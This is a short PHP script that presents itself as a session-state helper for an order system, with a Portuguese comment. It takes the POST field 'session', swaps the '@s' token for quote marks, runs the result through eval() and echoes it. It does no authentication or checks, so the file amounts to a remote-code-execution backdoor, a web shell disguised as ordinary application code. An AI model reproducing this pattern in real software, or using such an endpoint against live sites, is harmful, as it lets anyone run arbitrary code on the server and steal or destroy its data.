<?
header("Content-Type: text/html;  charset=ISO-8859-1");
session_start();
//include("../../../functions.php");
$id_session = $_POST['id_session'];
$post = str_replace('@s',"'",utf8_decode($_POST['session']));
$post = trim($post);
eval($post);
//$_SESSION['pedido'.$id_session][32] = true; //Passar novamente pela política
echo $post;
?>